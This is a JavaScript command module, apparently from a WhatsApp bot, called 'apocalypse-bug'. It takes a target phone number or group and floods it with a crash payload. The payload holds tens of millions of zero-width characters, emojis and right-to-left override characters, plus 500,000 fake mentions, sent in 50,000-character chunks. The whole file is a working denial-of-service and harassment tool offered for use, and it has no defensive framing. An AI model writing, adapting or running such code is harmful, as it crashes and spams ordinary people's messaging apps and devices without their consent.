import { bugsList } from "../bugmenu.js";

export default {
  name: "apocalypse-bug",
  description: "⚠️ Ultra-heavy crash with massive Unicode, emojis, zero-width, and mentions. DM & Group.",
  async execute(msg, { sock, args }) {
    try {
      const target = args[0];

      if (!target) {
        return sock.sendMessage(msg.key.remoteJid, {
          text: `⚠️ You selected *apocalypse-bug*. Please type the target number/group as:\n?bug apocalypse-bug <number/group>`
        });
      }

      // Format target
      let finalTarget = target;
      if (!target.includes("@g.us") && !target.includes("@s.whatsapp.net")) {
        if (target.length < 11) return sock.sendMessage(msg.key.remoteJid, { text: "⚠️ Invalid number. Use format: 234XXXXXXXXXX" });
        finalTarget = target + "@s.whatsapp.net";
      }

      // Ultra-heavy payload sizes
      const weights = {
        zeroWidth: 20_000_000,   // 20M chars
        emojiBomb: 5_000_000,    // 5M emojis
        rtlBomb: 2_000_000,      // 2M RTL chars
        mentions: 500_000         // mentions JSON
      };

      // Generate payload parts
      let payload = "";

      // Zero-width wall
      payload += "\u200B".repeat(weights.zeroWidth);

      // Emoji bomb
      payload += "👾👹👺💀☠️👻".repeat(weights.emojiBomb);

      // RTL + LTR override
      payload += ("\u202E\u200E\u200F\u200D\u200C").repeat(weights.rtlBomb);

      // Mentions JSON
      const PREFIX = "23491", UNIQUE_COUNT = 2000, TOTAL_COUNT = weights.mentions;
      const base = [];
      for (let i = 0; i < UNIQUE_COUNT; i++) base.push(PREFIX + String(1000000 + i).slice(-7) + "@s.whatsapp.net");
      const mentions = [];
      while (mentions.length < TOTAL_COUNT) mentions.push(...base);
      mentions.length = TOTAL_COUNT;
      payload += mentions.join("\n");

      // Send in chunks to prevent crashing the bot
      const CHUNK_SIZE = 50_000;
      for (let i = 0; i < payload.length; i += CHUNK_SIZE) {
        await sock.sendMessage(finalTarget, { text: payload.slice(i, i + CHUNK_SIZE) });
      }

      await sock.sendMessage(msg.key.remoteJid, { text: `✅ Sent *apocalypse-bug* to ${target}` });

    } catch (e) {
      await sock.sendMessage(msg.key.remoteJid, { text: "❌ Failed: " + e.message });
    }
  }
};
